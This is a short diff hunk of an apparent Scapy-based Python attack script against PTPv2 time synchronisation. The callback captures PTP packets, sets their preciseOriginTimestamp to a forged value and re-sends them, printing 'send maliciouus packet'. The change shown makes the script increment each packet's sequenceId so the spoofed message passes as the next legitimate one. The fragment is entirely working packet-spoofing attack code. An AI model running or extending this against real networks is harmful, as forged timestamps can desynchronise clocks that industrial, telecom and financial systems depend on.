@@ -11,6 +11,7 @@ def packet_callback(packet):
             used_seq_ids.add(packet[PTPv2].sequenceId)
             print("original packet")
             print(packet[PTPv2].show())
+            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
             packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 10)
             sendp(packet)
             print("send maliciouus packet")
